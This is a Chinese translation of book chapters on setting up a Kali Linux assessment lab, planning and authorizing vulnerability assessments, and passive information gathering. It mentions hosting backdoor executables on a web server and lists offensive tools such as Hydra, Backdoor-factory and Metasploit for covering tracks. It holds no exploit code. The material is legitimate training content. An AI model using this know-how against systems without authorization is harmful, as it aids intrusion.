# 保护网络设施：使用 NMAP 和 Nessus7 探索实用网络安全（三）

> 原文：[`annas-archive.org/md5/7D3761650F2D50B30F8F36CD4CF5CB9C`](https://annas-archive.org/md5/7D3761650F2D50B30F8F36CD4CF5CB9C)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十章：设置评估环境

在上一章中，我们了解了从治理角度理解漏洞管理程序的基本知识。本章将介绍建立全面的漏洞评估和渗透测试环境的各种方法和技术。我们将学习如何建立自己的环境，以便在本书后面讨论的各种漏洞评估技术中有效使用。

本章将涵盖以下主题：

+   设置 Kali 虚拟机

+   Kali Linux 的基础知识

+   环境配置和设置

+   评估过程中要使用的工具列表

# 设置 Kali 虚拟机

进行漏洞评估或渗透测试涉及一系列任务，需要借助多个工具和实用程序来执行。对于流程中涉及的每个任务，都有可用的工具，包括商业工具、免费软件和开源软件。这完全取决于我们根据上下文选择的最适合的工具。

为了进行端到端的评估，我们可以根据需要下载单独的工具，也可以使用 Kali Linux 这样的发行版，它预装了所有必需的工具。Kali Linux 是一个稳定、灵活、强大且经过验证的渗透测试平台。它具有执行各个渗透测试阶段各种任务所需的基本工具。它还允许您轻松添加默认安装中没有的工具和实用程序。

因此，Kali Linux 真的是一个很好的选择，用于漏洞评估和渗透测试的平台。

Kali Linux 可以在[`www.kali.org/downloads/`](https://www.kali.org/downloads/)下载。

下载后，您可以直接在系统上安装，也可以在虚拟机中安装。在虚拟机中安装的优势是可以保持现有操作系统设置不受干扰。此外，使用快照可以轻松进行配置备份，并在需要时进行恢复。

虽然 Kali Linux 可以以 ISO 文件的形式下载，但也可以作为完整的虚拟机下载。您可以根据您使用的虚拟化软件（VMware/VirtualBox/Hyper-V）下载正确的设置。Kali 虚拟机设置文件可在[`www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/`](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)下载。 

以下屏幕截图显示了 Kali Linux 在 VMware 中的情况。您可以通过选择“编辑虚拟机设置”选项来配置机器设置，分配内存并选择网络适配器类型。完成后，您可以简单地启动机器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/64e304c2-9e12-4b8b-aa28-264de2b89098.png)

# Kali Linux 的基础知识

访问 Kali Linux 的默认凭据是`username:root`和`password:toor`。但是，在第一次登录后，重要的是更改默认凭据并设置新密码。可以使用`passwd`命令来设置新密码，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/527cd47b-954d-4b41-aef9-cf8323433d04.png)

Kali Linux 广泛用于网络和应用程序渗透测试。因此，重要的是 Kali Linux 连接到网络，因为独立的 Kali 安装没有太多用处。确保网络连接的第一步是检查 Kali 是否有有效的 IP 地址。我们可以使用`ifconfig`命令，如下图所示，并确认 IP 地址分配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/ee55f814-5e42-44fd-bff3-db6eb438e3d4.png)

现在我们已经更改了默认凭据，并确认了网络连接，现在是时候检查我们的 Kali 安装的确切版本了。这包括确切的构建详细信息，包括内核和平台详细信息。`uname -a` 命令会给我们所需的详细信息，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e1078121-e771-466d-9005-77ca53262cff.png)

Kali Linux 是一个完整的渗透测试发行版，其中的工具可以协助渗透测试生命周期的各个阶段。单击应用程序菜单后，我们可以看到分布在各个类别中的所有可用工具，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/22af6113-f6e3-4bbb-b299-a71814b6ad75.png)

Kali Linux 配备了大量有用的工具和实用程序。有时，我们需要对这些工具和实用程序的配置文件进行更改。所有工具和实用程序都位于 `/usr/bin` 文件夹中，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b4192ad5-67cf-4312-ae49-a0cc430a6f71.png)

Kali Linux 使用多个在线仓库来提供软件安装和更新。然而，这些仓库源必须定期更新。可以使用 `apt-get update` 命令来实现，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1722c652-25e3-4dd2-ac7a-23585d693000.png)

Kali Linux 也会定期获得重大的构建更新。为了升级到最新可用的构建，可以使用 `apt-get upgrade` 命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/193e4130-406c-4f97-8084-748c255bde15.png)

Kali Linux 生成并存储各种类型的日志，如应用程序、系统、安全和硬件。这些日志对于调试和跟踪事件非常有用。可以通过打开位于应用程序 | 常用应用程序 | 实用程序 | 日志的日志应用程序来查看日志，结果如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/3d0752f1-32d4-4ff9-9849-d0301649747a.png)

# 环境配置和设置

虽然我们的基本 Kali 设置已经运行起来了，但我们还需要安装和配置一些我们在评估过程中可能需要的其他服务。在接下来的部分中，我们将讨论 Kali Linux 中一些有用的服务。

# Web 服务器

在渗透阶段，Web 服务器将对我们有所帮助，我们可能需要托管后门可执行文件。Apache Web 服务器默认安装在 Kali Linux 中。我们可以使用 `service apache2 start` 命令启动 Apache Web 服务器，如下截图所示。

我们可以使用 `netstat -an | grep ::80` 命令来验证服务是否成功启动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a8ae05f5-dcbd-4e55-a360-58de9cc26657.png)

现在 Apache 服务器已经运行起来了，我们也可以通过浏览器进行验证。通过访问本地主机 (`127.0.0.1`)，我们可以看到默认的 Apache 网页，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6182d0b1-b2ec-4fb9-9ce5-7543cde36a3e.png)

如果我们想要更改默认页面，或者希望托管任何文件，可以通过将所需文件放置在 `/var/www/html` 目录中来实现，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/55ba3447-79c1-4be9-80d2-bea1bbc2fea5.png)

# 安全外壳 (SSH)

SSH 确实是远程安全通信需要时的默认协议选择。

在 Kali Linux 中，我们可以通过首先安装 SSH 包来开始使用 SSH。可以使用 `apt-get install ssh` 命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/de95ca75-abd8-4aec-a7da-d9f23ebdab36.png)

为了确保 SSH 在重新启动后自动启动，我们可以使用 `systemctl` 命令，如下截图所示，可以使用 `service ssh start` 命令启动 SSH 服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a0828a0d-f41a-4fe3-8206-f9514960a9e8.png)

# 文件传输协议 (FTP)

使用 Web 服务器可以快速托管和提供小文件，但 FTP 服务器提供了更好和可靠的解决方案来托管和提供大文件。我们可以在 Kali Linux 上使用`apt-get install vsftpd`命令来安装 FTP 服务器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d65fc672-11a9-4bd3-927a-9c105f183b8f.png)

安装后，我们可以通过修改`/etc/vsftpd.conf`文件来根据需要编辑配置。完成必要的配置后，我们可以使用`service vsftpd start`命令来启动 FTP 服务器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/78edd188-5d83-4da6-b88c-1fdeb087a649.png)

# 软件管理

命令行实用程序`apt-get`可用于安装大多数所需的应用程序和实用程序。但是，Kali Linux 还有一个用于管理软件的图形界面工具。可以使用以下路径访问该工具：应用程序 | 常用应用程序 | 系统工具 | 软件。

软件管理器可用于删除现有软件或添加新软件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/dcf6fa8a-b9c4-4431-9381-28830a3461c5.png)

# 要在评估期间使用的工具列表

在渗透测试生命周期中有大量可用工具来执行各种任务。然而，以下是在渗透测试期间最常用的工具列表：

| **序号** | **渗透测试阶段** | **工具** |
| --- | --- | --- |
| 1 | 信息收集 | SPARTA, NMAP, Dmitry, Shodan, Maltego, theHarvester, Recon-ng |
| 2 | 枚举 | NMAP, Unicornscan |
| 3 | 漏洞评估 | OpenVAS, NExpose, Nessus |
| 4 | 获取访问权限 | Metasploit, Backdoor-factory, John The Ripper, Hydra |
| 5 | 特权升级 | Metasploit |
| 6 | 覆盖痕迹 | Metasploit |
| 7 | Web 应用程序安全测试 | Nikto, w3af, Burp Suite, ZAP Proxy, SQLmap |
| 8 | 报告 | KeepNote, Dradis |

# 摘要

在本章中，我们了解到在虚拟环境中使用 Kali Linux 可以有效地进行漏洞评估和渗透测试。我们还学习了一些关于 Kali Linux 的绝对基础知识，并配置了其环境。


# 第十一章：安全评估先决条件

在我们可以开始实际进行安全评估之前，实际上需要做很多基础工作，包括规划、范围确定、选择正确的测试、资源分配、测试计划以及获得文件签署和批准。所有这些先决条件将有助于确保安全评估的顺利进行。本章将讨论以下主题：

+   目标范围和规划

+   收集需求

+   决定漏洞评估的类型

+   资源和可交付成果的估算

+   准备测试计划和测试边界

+   获得批准并签署保密协议

# 目标范围和规划

定义和决定正式范围是漏洞评估中最重要的因素之一。虽然可能有很多关于使用各种漏洞评估工具和技术的信息和指南，但漏洞评估的准备阶段往往被忽视。忽视充分完成前期活动可能会导致潜在问题，例如以下问题：

+   范围蔓延

+   客户不满意

+   法律问题

项目的范围旨在准确定义需要进行测试的内容。

从理论上讲，测试网络中的每个资产似乎是最好的选择；然而，这可能并不实际可行。与所有业务部门进行详细讨论可以帮助您收集关键资产清单。然后，这些资产可以包括在漏洞评估范围内。漏洞评估范围中包括的一些常见资产如下：

+   通信线路

+   电子商务平台

+   任何面向互联网的网站

+   特殊用途设备（调制解调器、无线电等）

+   应用程序和应用程序 API

+   电子邮件网关

+   远程访问平台

+   邮件服务器

+   DNS

+   防火墙

+   FTP 服务器

+   数据库服务器

+   Web 服务器

在关于应该包括在漏洞评估范围内的候选资产的上述清单中，可能有一些其他经常被忽视但可能为攻击者打开入口的资产。这些资产包括以下内容：

+   打印机

+   无线接入点

+   共享驱动器

+   IP 摄像头

+   智能电视

+   生物识别门禁系统

范围的详细概述将帮助漏洞评估团队规划资源和时间表。

# 收集需求

在我们甚至考虑开始漏洞评估之前，非常重要的是非常清楚地了解客户的需求。客户可能是组织内部或外部的。对于 VA 测试人员来说，了解客户对测试的期望是很重要的。为了识别和记录客户需求，需要完成以下工作。

# 准备详细的测试要求清单

测试人员需要与客户安排多次会议，以了解他们的需求。结果应包括但不限于以下内容：

+   客户希望遵守的安全合规性清单

+   在各自的安全合规性中规定的要求和行为准则（如果有）

+   受范围限制的网络段清单

+   受范围限制的网络段中的网络安全设备清单

+   要扫描的资产清单（以及 IP 范围）

+   暴露在公共网络中的资产清单（以及 IP 范围）

+   具有网络范围访问权限的资产清单（以及 IP 范围）

+   业务关键资产清单（以及 IP 范围）

+   客户环境中可接受的漏洞评估工具清单

+   客户或合作伙伴建议的工具的许可证可用性

+   在客户环境中严格禁止使用的工具清单

+   最近的漏洞评估报告（如果有）

# 合适的时间框架和测试时间

一些安全合规要求要求定期对范围内的基础设施进行漏洞评估。例如，PCI/DSS 要求对业务关键资产进行半年漏洞评估，对 PCI/DSS 认证范围内的非关键资产进行年度漏洞评估。

测试人员和客户在准备评估计划时需要牢记这些合规性要求。同时，考虑到评估范围内环境中正在进行的关键变化总是有益的。如果安全合规要求规定的时间允许的话，最好在完成关键变化后进行评估，这将有助于提供当前安全状况的持久视图。

漏洞评估中调度和计划的另一个有趣部分是测试时间。通常，使用自动化扫描配置文件来执行漏洞评估，并消耗大量网络流量（每个端口/主机/资产的请求/响应）并且可能也会消耗被扫描的资产/主机的大量资源。在罕见的情况下，可能会发生某个资产/主机停止响应，进入**拒绝服务**（DoS）模式和/或完全关闭模式。这种情况也可能发生在业务关键系统上。现在想象一下，在高峰业务时间内，业务关键系统/服务不响应任何请求。这也可能影响其他服务，涵盖更广泛的用户空间。这可能导致数据、声誉和收入的损失。此外，在这种混乱的情况下恢复和恢复业务功能也会带来挑战。因此，建议在工作时间之外进行漏洞评估。这样做的好处包括：

+   由于没有通常的业务/合法流量，网络上没有额外的开销

+   自动扫描在网络带宽更大的情况下完成得更快

+   漏洞评估的影响（如果有的话）可以很快被观察到，因为网络流量已经减少

+   影响和副作用可以轻松处理（恢复/恢复），因为业务/收入和声誉损失的风险被降到可接受的限度

但在这种方法中可能会有一些例外情况，测试人员需要在工作时间进行评估。其中一种情况可能是需要评估用户工作站的漏洞。由于用户工作站只在工作高峰时间可用，因此只有在工作时间才应扫描该网络段。

总之，这个阶段的结果是：

+   进行漏洞评估的业务和合规需求

+   进行漏洞评估的时间框架（可能会受到某些安全合规要求的约束）

+   工作时间和非工作时间

+   关键资产和非关键资产的测试时间

+   对具有相应 IP 的最终用户工作站列表进行测试

# 识别利益相关者

漏洞管理采用自上而下的方法。以下是可能参与和/或受漏洞评估影响的利益相关者：

+   **高管/高层管理人员**：为了实现漏洞评估计划的成功，高层管理人员应支持该活动，通过分配所有必要的资源来支持该活动。

+   **IT 安全负责人**：这可能是专门的或额外的责任，分配给胜任的人员。通常，这个职位直接向高管/高层管理人员汇报，向高层管理人员提供安全状况的鸟瞰图。为了保持安全合规性，这个职位领导组织中运行的多个 IT 安全项目。

+   **VA 主管测试人员**：这个职位指的是通常向 IT 安全负责人汇报的专业人员。VA 主管负责：

+   签署工作声明（SoW）

+   保持保密协议

+   检查在特定环境中进行此类测试的法律方面

+   收集要求并定义范围

+   规划漏洞评估

+   管理所需的工具、设备和漏洞评估所需的许可证

+   管理漏洞评估的团队和团队活动

+   在漏洞评估程序中，维护**单点联系人**（**SPOC**）与所有利益相关者之间的联系

+   让所有利益相关者了解漏洞评估的活动

+   生成并签署漏洞评估的执行摘要

+   **VA 测试人员**：VA 测试人员进行以下必要的活动来进行 VA 程序：

+   配置和更新自动化扫描工具/设备

+   监控自动化扫描，以检测任何干扰或未经请求的影响

+   进行手动测试

+   进行**概念验证**（**PoCs**）

+   生成详细报告

+   向 VA 主测试人员及时提供更新

+   **资产所有者**：作为漏洞评估的一部分，每个服务/系统/应用程序/网络/设备都参与其中。所有者负责对可能发生的任何干扰做出响应。所有者应了解其所有权下资产的详细评估计划，并应准备好恢复和恢复计划以减少影响。

+   **第三方服务提供商**：**商业现成**（**COTS**）应用的所有权属于各自的服务提供商。如果范围要求对此类 COTS 资产进行评估，则需要涉及相应的第三方。最近，组织越来越多地选择云服务。因此，需要将相应云服务提供商的 SPOC 纳入程序，以确保 VA 的顺利执行。

+   **最终用户**：很少情况下，最终用户可能也会受到 VA 程序的影响。

# 确定漏洞评估的类型

在了解客户的需求后，测试人员需要根据漏洞管理程序的期望、环境、过去的经验和每种类型提供的曝光来创建自己的测试模型。

以下是测试人员需要了解的基本漏洞评估类型。

# 漏洞评估的类型

以下图表概述了不同类型的漏洞评估：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e55e5405-268d-4a63-8c4a-75fc0f804325.png)

# 基于位置的漏洞评估类型

根据测试所在位置，漏洞评估可以分为两种主要类型：

+   外部漏洞评估

+   内部漏洞评估

# 外部漏洞评估

外部漏洞评估最适合托管公共服务的公共网络上暴露的资产。它是从目标网络外部进行的，因此有助于模拟真实攻击者攻击目标的实际情况。进行外部漏洞评估的主要目的是发现目标系统安全的潜在弱点，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7985547e-e21e-4db2-8fd4-f2207e202f5b.png)

外部漏洞评估主要集中在与目标相关的服务器、基础设施和底层软件组件上。这种类型的测试将涉及对有关目标的公开信息的深入分析，网络枚举阶段，其中识别和分析所有活动目标主机，以及中间安全筛选设备（如防火墙）的行为。然后识别漏洞，验证并评估影响。这是漏洞评估最传统的方法。

# 内部漏洞评估

内部漏洞评估是针对暴露在私人网络（公司内部）中托管内部服务的资产进行的。内部漏洞评估主要是为了确保网络内部人员不能通过滥用自己的权限未经授权访问任何系统，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b5fade48-e458-401c-8f45-fb14dd4c1922.png)

内部漏洞评估用于识别组织网络内特定系统的弱点。当漏洞评估团队从目标网络内执行测试时，所有外部网关、过滤器和防火墙都被绕过，测试直接针对范围内的系统。内部漏洞评估可能涉及从各种网络段进行测试，以检查虚拟隔离。

# 基于对环境/基础设施的了解

以下是模拟攻击者视角下的暴露的漏洞评估类型，基于对环境/基础设施的了解。

# 黑盒测试

在黑盒漏洞评估方法中，漏洞评估测试人员在没有任何关于目标系统的事先知识的情况下进行所有测试。这种测试最接近真实世界的攻击。在理想的黑盒测试场景中，漏洞评估测试人员可能只知道目标组织的名称。他将不得不从零开始收集有关目标的信息，然后逐渐构建和执行各种攻击场景。这种测试通常需要更长的时间来完成，而且需要更多的资源。

# 白盒测试

白盒漏洞评估是在完全了解目标基础设施、防御机制和通信渠道的情况下进行的测试。这种测试专门旨在模拟通常以完全权限和对目标系统的完全访问权限执行的内部人员攻击。为了启动白盒漏洞评估，目标组织与漏洞评估测试人员分享所有细节，如资产清单、网络拓扑图等。

# 灰盒测试

灰盒测试是黑盒测试和白盒测试的结合。在这种测试中，漏洞评估测试人员对目标基础设施、防御机制和通信渠道有部分了解。它试图模拟那些由内部人员或有限访问权限的外部人员执行的攻击。与黑盒测试相比，这种测试所需的时间和资源相对较少。

# 公布和未公布的测试

在公布的漏洞评估中，尝试破坏目标系统是在完全合作并事先知道目标 IT 人员的情况下进行的。漏洞评估测试人员可能会与 IT 人员讨论优先考虑特定系统进行破坏。在未经通知的漏洞评估中，漏洞评估团队不会事先通知目标人员。这是一种意外测试，旨在检查目标组织的安全准备和响应能力。只有高级管理人员会被告知测试情况。

# 自动化测试

一些组织和安全测试团队不使用个人专业知识，而是更喜欢自动化安全测试。这通常是通过工具来完成的，该工具针对目标系统的主机运行，以评估安全姿态。该工具尝试模拟入侵者可能使用的真实世界攻击。根据攻击是否成功，工具会生成详细的报告。自动化测试可能易于快速执行，但可能会产生大量的假阳性。自动化测试也无法评估架构级别的安全缺陷（设计缺陷）、业务逻辑缺陷和任何其他程序上的缺陷。

# 经过身份验证和未经身份验证的扫描

为了执行经过身份验证的扫描，扫描工具可以配置为使用由集中目录（域控制器/AD/LDAP）控制的凭据。在执行扫描时，扫描器尝试使用配置的凭据与资产建立**远程过程调用**（**RPC**），成功登录后，以提供的凭据的特权级别执行相同特权级别的测试。

经过身份验证的扫描报告了向系统的经过身份验证用户暴露的弱点，因为所有托管服务都可以使用正确的凭据访问。未经身份验证的扫描从系统的公共视角报告了弱点（这是系统对未经身份验证用户的外观）。

经过身份验证的扫描相对于未经身份验证的优势如下：

+   模拟用户视角下的安全姿态

+   提供全面的扫描，覆盖更多暴露的攻击面

+   报告提供了资产上暴露的详细漏洞，这些漏洞可以被恶意用户利用

+   假阳性较少

+   报告的准确性提高了

经过身份验证的扫描相对于未经身份验证的劣势如下：

+   完成扫描需要更多时间，因为它涵盖了更多的扫描签名

+   增加了用于扫描的凭据管理的开销

+   强烈测试签名的参与可能会干扰资产托管的服务

# 无代理和基于代理的扫描

最新的自动化扫描工具提供了安装在相应资产上的扫描服务的代理。该服务通常以最高可能的特权运行。一旦扫描器接收到来自主机上运行的服务的触发器，该服务就会从扫描器本身在资产上本地运行的扫描中获取该特定资产的相应扫描配置文件。

基于代理的扫描相对于无代理扫描的优势如下：

+   对网络没有额外开销，因为扫描在系统上本地运行

+   无需等待非营业时间来启动对非关键资产的测试

+   扫描间隔可以缩短，有助于保持安全姿态的最新状态

+   无需维护专门用于扫描的凭据

+   提供全面的扫描，覆盖更多暴露的攻击面

+   报告提供了资产上暴露的详细漏洞

+   假阳性较少

+   报告的准确性提高了

基于代理的扫描相对于无代理扫描的劣势如下：

+   代理可能不支持特殊设备（调制解调器、无线电等）和所有操作系统和固件。

+   在每个兼容资产上安装代理——尽管这在大型环境中只需一次活动，但这将是一个挑战

+   管理和保护代理本身——因为代理正在以更高的特权运行服务，这些代理需要非常谨慎地管理和保护

# 手动测试

手动漏洞评估是最佳选择之一。它受益于经过良好训练的安全专业人员的专业知识。手动测试方法涉及详细的范围界定、规划、信息收集、漏洞扫描、评估和利用。因此，它肯定比自动测试更耗时和资源，但是产生误报的可能性较小。

通常，组织和漏洞评估团队倾向于结合自动化和手动测试，以便充分发挥两者的优势。

# 估计资源和可交付成果

与任何项目一样，漏洞评估的成功取决于接近实际的估计。来自范围界定和规划阶段的输出有助于估计漏洞评估最重要的因素——完成评估所需的时间。

如果测试人员在受限环境或类似环境中有很好的经验，那么估计是基于以前的经验进行的。如果测试人员对环境不熟悉，则会参考以前的测试报告和沟通来进行估计。此外，测试人员还会考虑范围的增加和变化，第三方服务/服务提供商的参与（如果有的话），并相应地更新估计。

一旦粗略估计完成，就会考虑时间填充，并在预期所需时间上增加时间。这种时间填充通常设置为 20%。这有助于测试人员应对执行过程中可能遇到的任何意外挑战。

以下是在执行漏洞评估过程中可能面临的一些意外挑战/问题：

+   **网络安全设备阻止扫描**：网络安全设备，如防火墙、入侵防御系统（IPS）和统一威胁管理（UTM），将扫描流量检测为恶意流量，并阻止漏洞扫描器发送的所有请求。一旦在相应的网络安全设备上生成警报，测试人员需要要求网络管理员将自动化扫描器 IP 和手动测试机 IP 列入白名单。

+   **资产对某些测试的副作用不响应**：某些扫描签名会使资产处于 DoS 模式。在这种情况下，测试人员需要识别这些资产，并调整扫描配置文件，以便对这些系统进行全面扫描。通常，这种对扫描敏感的系统是闭源和开箱即用的解决方案。

+   **扫描影响业务关键服务，因此需要突然停止扫描**：某些漏洞扫描签名可能会破坏系统上的某些服务。由于业务始终是首要任务，扫描必须停止，并且业务关键服务需要恢复。测试人员需要在非工作时间对这些资产进行单独的扫描，使用较少密集和/或经过调整的扫描配置文件。

+   **阻止用于扫描的用户 ID**：由于对集中式身份访问管理系统（IDAM）的大量流量，执行经过身份验证的扫描时，登录尝试可能被归类为恶意，并且扫描帐户可能会被阻止。

+   **由于扫描流量而导致网络减速，因此在报告生成过程中引入延迟**：在执行自动化扫描时，激进和密集的扫描配置会给网络流量带来额外负担。这可能会减慢网络速度，或者使一些网络设备处于故障关闭状态，阻止扫描请求到达资产。

通常，这种填充通常没有完全利用。在这种情况下，为了公平对待客户，测试人员可以利用这些额外的时间为漏洞报告增加更多的价值。例如：

+   深入探讨已识别的关键漏洞，以找出漏洞对整体基础设施安全性的影响

+   运行一些手动 POC，以减少对关键、高度严重的漏洞的误报

+   为利益相关者进行漏洞报告的详细讲解

+   提供有关漏洞关闭的额外指导

时间估算是以测试所需的人时形式进行的，但测试人员还应考虑，为项目部署更多人员并不总是会缩短时间。

例如，当自动漏洞评估套件/扫描器在网络段或资产组上启动测试时，进行测试所需的时间取决于所涉及的基础设施、要扫描的资产数量、资产的性能、网络流量、测试配置文件的强度以及许多其他外部因素。由于自动扫描几乎不需要测试人员的交互，因此在这个阶段部署更多的测试人员并不会减少时间。但手动测试不是这样的情况。手动测试用例可以由多个测试人员同时并行执行，大大缩短时间。

考虑的另一个因素是对资产进行测试的范围或强度。对于关键资产，需要进行深入测试，使用更强烈的扫描配置文件，而对于非关键资产，通常仅需概述即可。运行自动化和手动测试的强烈扫描配置文件所需的时间比正常扫描配置文件的时间要多得多。

时间估算的结果是明确的最后期限。漏洞评估应该始终在预定的日期开始，并在预计的结束日期完成。由于漏洞评估涵盖了庞大的基础设施，许多系统所有者和第三方都积极参与其中。支持漏洞评估的额外责任通常是参与方的负担。因此，为了保持他们在漏洞评估过程中的组织、同步、积极性和支持，明确的最后期限非常重要。

# 准备测试计划

漏洞评估通常是一个持续进行的练习，定期重复。然而，在给定的时间段内，漏洞评估确实有一个特定的起点和终点，无论进行何种类型的测试。因此，为了确保成功的漏洞评估，需要一个详细的计划。计划可以包括以下几个元素：

+   **概述**：本节为测试计划提供了高层次的定位。

+   **目的**：本节说明了进行测试的整体目的和意图。可能存在一些法规要求或客户的明确要求。

+   **适用的法律和法规**：本节列出了与计划中的测试相关的所有适用的法律和法规。这些可能包括本地和国际法律。

+   **适用的标准和指南**：本节列出了与计划中的测试相关的所有适用的标准和指南，如果有的话。例如，在 Web 应用程序漏洞评估的情况下，可能会遵循 OWASP 等标准。

+   **范围**：范围是计划的重要部分，因为它基本上列出了将进行测试的系统。不正确的范围可能严重影响未来的测试交付物。范围必须详细列出，包括目标系统的主机和 IP 地址、Web 应用程序和数据库（如果有的话）以及用于测试的权限。

+   **假设**：本节主要概述了测试的先决条件必须及时提供给漏洞评估测试人员。这将确保由于操作问题不会出现任何延迟。这也可能包括这样一个事实，即在测试期间，受范围约束的系统不会进行重大升级或更改。

+   **方法论**：本节涉及将采用的测试方法论类型。根据组织的要求，它可以是黑盒、灰盒或白盒。

+   **测试计划**：本节详细介绍了谁将执行测试、每日时间表、详细任务和联系信息。

+   **参与规则**：本节列出了测试期间需要遵循的专有条款和条件。例如，组织可能希望排除某些系统不受自动扫描的影响。这样的明确条件和要求可以在参与规则中提出。

+   **利益相关者沟通**：本节列出了在整个测试过程中将参与其中的所有利益相关者。及时向所有利益相关者更新测试进展非常重要。必须经高级管理层批准才能包括在内的利益相关者。

+   **责任**：本节突出了测试期间可能发生的任何行为或事件的责任，这可能对业务运营产生不利影响。责任在双方，即组织和 VA 测试人员。

+   **授权批准和签名**：一旦所有前述部分都经过仔细起草并达成一致意见，有必要由相关权威签署计划。

全面的测试计划也被称为**工作声明**（**SoW**）。

# 获得批准并签署保密和保密协议

根据具体要求，组织可能选择进行早期讨论中讨论的任何类型的漏洞评估。然而，重要的是漏洞评估得到高级管理层的批准和授权。尽管大多数专业漏洞评估都是以相当受控的方式进行的，但仍然存在某些可能会变得破坏性的可能性。在这种情况下，来自高级管理层的预先批准支持至关重要。

保密协议是测试开始之前 VA 测试人员必须签署的最重要文件之一。该协议确保测试结果得到高度保密处理，并且发现结果只向授权的利益相关者披露。组织内部的漏洞评估团队可能不需要为每次测试签署保密协议，但对于外部团队进行的任何测试，这是绝对必要的。

# 保密和保密协议

进行漏洞评估的任何外部个人在测试开始之前需要签署保密和保密协议。漏洞评估的整个过程涉及包含关键信息的多个文件。如果这些文件泄露给任何第三方，可能会造成潜在的损害。因此，漏洞评估测试人员和组织必须相互同意并在保密和保密协议中签署条款和条件。以下是签署保密和保密协议的一些好处：

+   确保组织的信息得到高度保密对待

+   为其他许多领域提供保障，例如在发生任何意外事件时的疏忽和责任

保密和保密协议都是强大的工具。一旦协议得到签署，如果信息被故意或无意地泄露给未经授权的第三方，组织甚至有权对测试人员提起诉讼。

# 总结

进行基础设施漏洞评估之前，有许多先决条件。在本章中，我们试图简要介绍所有这些先决条件。从下一章开始，我们将处理实际的漏洞评估方法论。


# 第十二章：信息收集

在上一章中，我们讨论了漏洞管理计划的范围和规划。本章是关于学习有关目标系统的各种工具和技术的信息收集。我们将学习应用各种技术并使用多种工具，以有效地收集有关范围内目标的尽可能多的信息。从这个阶段收集到的信息将被用作下一个阶段的输入。

本章中，我们将涵盖以下主题：

+   定义信息收集

+   被动信息收集

+   主动信息收集

# 什么是信息收集？

信息收集是实际评估的第一步。在使用漏洞扫描仪扫描目标之前，测试人员应该更多地了解测试范围内的资产的详细信息。这将帮助测试团队为扫描优先考虑资产。

# 信息收集的重要性

“给我六个小时砍倒一棵树，我将花前四个小时磨削斧头。”

这是亚伯拉罕·林肯的一句非常古老而著名的名言。同样适用于在执行任何安全评估之前尽可能多地收集信息。除非您对目标了如指掌，否则您将无法成功执行其安全评估。对于目标具有全方位的了解，并通过所有可用的来源收集有关它的所有可能信息是至关重要的。

一旦您确信已经收集到足够的信息，那么您可以非常有效地计划实际的评估。信息收集可以分为两种类型，如下节所述：被动信息收集和主动信息收集。

# 被动信息收集

被动信息收集是一种技术，其中不直接与目标进行联系以收集信息。所有信息都是通过可能是公开可用的中间来源获取的。互联网上有许多有用的资源可以帮助我们进行被动信息收集。接下来将讨论一些这样的技术。

以下图表描述了被动信息收集的工作原理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/4989e0fd-2dde-459f-92b6-d46ccbf856e1.jpg)

以下是它的工作原理：

1.  客户端系统首先向中间系统发送请求

1.  中间系统探测目标系统

1.  目标系统将结果发送回中间系统

1.  中间系统将其转发回客户端

因此，客户端与目标系统之间没有直接联系。因此，客户端对目标系统部分匿名。

# 反向 IP 查找

反向 IP 查找是一种用于探测任何给定 IP 地址所托管的所有域的技术。因此，您只需要提供目标 IP 地址，然后您将返回托管在该 IP 地址上的所有域。一个这样的反向 IP 查找工具可以在[`www.yougetsignal.com/tools/web-sites-on-web-server/`](http://www.yougetsignal.com/tools/web-sites-on-web-server/)上在线使用。

反向 IP 查找仅适用于面向互联网的网站，并不适用于托管在内部网络上的网站。

# 站点报告

一旦您获得目标域名，您可以获得有关该域名的许多有用信息，例如其注册商、域名服务器、DNS 管理员、使用的技术等。 Netcraft，可在[`toolbar.netcraft.com/site_report`](http://toolbar.netcraft.com/site_report)上在线使用，是一个非常方便的工具，可以在线获取域名信息：

